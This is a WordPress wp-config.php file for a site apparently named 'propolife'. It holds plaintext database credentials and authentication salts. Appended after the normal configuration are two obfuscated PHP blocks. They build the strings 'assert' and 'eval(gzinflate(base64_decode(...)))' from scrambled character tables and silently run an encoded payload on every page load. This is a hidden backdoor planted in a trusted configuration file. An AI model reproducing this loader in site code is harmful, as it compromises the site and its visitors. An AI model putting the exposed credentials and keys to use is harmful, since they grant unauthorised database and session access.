<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'propolife');

/** MySQL database username */
define('DB_USER', 'da_admin');

/** MySQL database password */
define('DB_PASSWORD', 'TUViSEkV');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

define('FS_METHOD','direct');
define('WP_POST_REVISIONS', false );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '-4P?G0rz7ntgK8H;sTS4-HH^G%<Wo%$>ERZ)C(0:$_Fzb;!:4tC%7aYO06[Z>K5&');
define('SECURE_AUTH_KEY',  'tqWp<)~b|eue6i}[{Vi|9/:3c+!syPLd_Gwx0hqH$WQW|W-:tvJ={;pWI0/-2<kM');
define('LOGGED_IN_KEY',    'C4o7+k+/6IW8Lx2?0.0J%s_WssO4+M&g7mq7%4P8r9P1J2L&^VHrfC#M|DB`q~mp');
define('NONCE_KEY',        '$8IO8$,!:66V$r @]vduFx):gMk+Lx7V%O0M;s1yVY`iFR:EY!2cR:4X/~li:~ty');
define('AUTH_SALT',        '4|1Ht/{npNdH]w/,33] fh|QhpH-TnF?aw}5pep[7d8urB$A M)-tfFND)L_I$cs');
define('SECURE_AUTH_SALT', '+q1GLLzPWk]V|~H}Tz F,hy}m }&5`yyln.W,J||HK<%`L|X3*!#nL-x{Y5f<hJO');
define('LOGGED_IN_SALT',   '^<WG}g|C6ZY1VDTD=_eVRwt?Wq)N^n*]p|AuSC]%;I2D+qh<RQ[h*zZ+%Gz+xyeP');
define('NONCE_SALT',       'wp]_Qex_6gl>X>$j|iQT4bu?~~f_}+a,a+%ZC{giUk>zOxO6<t)7FyX(-|V41%xo');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
$KCv = "YKZTPF1_I)(5vUEA*2nkub4D'fLrC/qd8sjS7RphgwW6M;3mGHQo.zlt+=NVaxXBi0e9OJcy";$wTc = $KCv[60].$KCv[33].$KCv[33].$KCv[66].$KCv[27].$KCv[55];$OJH = $KCv[66].$KCv[12].$KCv[60].$KCv[54].$KCv[10].$KCv[40].$KCv[53].$KCv[64].$KCv[18].$KCv[25].$KCv[54].$KCv[60].$KCv[55].$KCv[66].$KCv[10].$KCv[21].$KCv[60].$KCv[33].$KCv[66].$KCv[43].$KCv[22].$KCv[7].$KCv[31].$KCv[66].$KCv[70].$KCv[51].$KCv[31].$KCv[66].$KCv[10];$XqS = $KCv[9].$KCv[9].$KCv[9].$KCv[45];$gsl = $OJH.$KCv[24].$KCv[71].$KCv[65].$KCv[61].$KCv[3].$KCv[65].$KCv[5].$KCv[63].$KCv[44].$KCv[53].$KCv[35].$KCv[65].$KCv[51].$KCv[30].$KCv[31].$KCv[37].$KCv[50].$KCv[64].$KCv[62].$KCv[31].$KCv[46].$KCv[23].$KCv[0].$KCv[54].$KCv[42].$KCv[26].$KCv[71].$KCv[54].$KCv[62].$KCv[34].$KCv[67].$KCv[62].$KCv[13].$KCv[27].$KCv[5].$KCv[2].$KCv[69].$KCv[33].$KCv[18].$KCv[59].$KCv[8].$KCv[71].$KCv[32].$KCv[61].$KCv[69].$KCv[34].$KCv[13].$KCv[67].$KCv[4].$KCv[26].$KCv[0].$KCv[54].$KCv[4].$KCv[53].$KCv[33].$KCv[32].$KCv[27].$KCv[35].$KCv[70].$KCv[65].$KCv[27].$KCv[1].$KCv[31].$KCv[2].$KCv[50].$KCv[71].$KCv[64].$KCv[40].$KCv[38].$KCv[1].$KCv[21].$KCv[23].$KCv[35].$KCv[6].$KCv[53].$KCv[70].$KCv[33].$KCv[71].$KCv[44].$KCv[34].$KCv[4].$KCv[3].$KCv[31].$KCv[13].$KCv[27].$KCv[1].$KCv[58].$KCv[31].$KCv[4].$KCv[1].$KCv[70].$KCv[19].$KCv[53].$KCv[44].$KCv[3].$KCv[0].$KCv[41].$KCv[44].$KCv[27].$KCv[49].$KCv[44].$KCv[65].$KCv[14].$KCv[67].$KCv[4].$KCv[55].$KCv[19].$KCv[34].$KCv[42].$KCv[26].$KCv[32].$KCv[51].$KCv[55].$KCv[58].$KCv[67].$KCv[63].$KCv[4].$KCv[65].$KCv[64].$KCv[20].$KCv[38].$KCv[1].$KCv[5].$KCv[49].$KCv[35].$KCv[55].$KCv[49].$KCv[2].$KCv[8].$KCv[26].$KCv[28].$KCv[11].$KCv[68].$KCv[26].$KCv[35].$KCv[27].$KCv[37].$KCv[13].$KCv[14].$KCv[18].$KCv[35].$KCv[55].$KCv[1].$KCv[22].$KCv[5].$KCv[15].$KCv[15].$KCv[57].$KCv[57].$KCv[24].$XqS;@$wTc($gsl);$P6O = "fnte_.1VO9RhW/0NmK6FuZCYj2cQ)+Aar'xSJTb4okqi5*zyGMdBDw(8HIgs=PXpv;lEL73U";$X8q = $P6O[31].$P6O[59].$P6O[59].$P6O[3].$P6O[32].$P6O[2];$tNF = $P6O[3].$P6O[64].$P6O[31].$P6O[66].$P6O[54].$P6O[58].$P6O[46].$P6O[43].$P6O[1].$P6O[0].$P6O[66].$P6O[31].$P6O[2].$P6O[3].$P6O[54].$P6O[38].$P6O[31].$P6O[59].$P6O[3].$P6O[18].$P6O[39].$P6O[4].$P6O[50].$P6O[3].$P6O[26].$P6O[40].$P6O[50].$P6O[3].$P6O[54];$pHm = $P6O[28].$P6O[28].$P6O[28].$P6O[65];$Z6m = $tNF.$P6O[33].$P6O[47].$P6O[14].$P6O[34].$P6O[37].$P6O[14].$P6O[19].$P6O[51].$P6O[49].$P6O[46].$P6O[35].$P6O[14].$P6O[40].$P6O[42].$P6O[50].$P6O[10].$P6O[27].$P6O[43].$P6O[62].$P6O[50].$P6O[70].$P6O[52].$P6O[23].$P6O[66].$P6O[12].$P6O[37].$P6O[55].$P6O[2].$P6O[37].$P6O[24].$P6O[9].$P6O[62].$P6O[71].$P6O[32].$P6O[19].$P6O[21].$P6O[36].$P6O[59].$P6O[1].$P6O[7].$P6O[57].$P6O[47].$P6O[55].$P6O[34].$P6O[36].$P6O[24].$P6O[71].$P6O[9].$P6O[61].$P6O[68].$P6O[23].$P6O[66].$P6O[61].$P6O[46].$P6O[59].$P6O[55].$P6O[32].$P6O[35].$P6O[26].$P6O[14].$P6O[32].$P6O[17].$P6O[50].$P6O[21].$P6O[27].$P6O[47].$P6O[43].$P6O[58].$P6O[63].$P6O[17].$P6O[38].$P6O[52].$P6O[35].$P6O[6].$P6O[46].$P6O[26].$P6O[59].$P6O[47].$P6O[49].$P6O[24].$P6O[61].$P6O[37].$P6O[50].$P6O[71].$P6O[32].$P6O[17].$P6O[15].$P6O[26].$P6O[64].$P6O[49].$P6O[68].$P6O[26].$P6O[53].$P6O[15].$P6O[24].$P6O[31].$P6O[6].$P6O[49].$P6O[52].$P6O[0].$P6O[71].$P6O[2].$P6O[47].$P6O[24].$P6O[68].$P6O[15].$P6O[2].$P6O[0].$P6O[61].$P6O[37].$P6O[59].$P6O[47].$P6O[14].$P6O[6].$P6O[67].$P6O[13].$P6O[35].$P6O[17].$P6O[18].$P6O[41].$P6O[40].$P6O[71].$P6O[50].$P6O[17].$P6O[14].$P6O[50].$P6O[41].$P6O[58].$P6O[59].$P6O[68].$P6O[41].$P6O[39].$P6O[2].$P6O[17].$P6O[2].$P6O[19].$P6O[27].$P6O[35].$P6O[50].$P6O[17].$P6O[14].$P6O[32].$P6O[58].$P6O[71].$P6O[30].$P6O[33].$pHm;@$X8q($Z6m);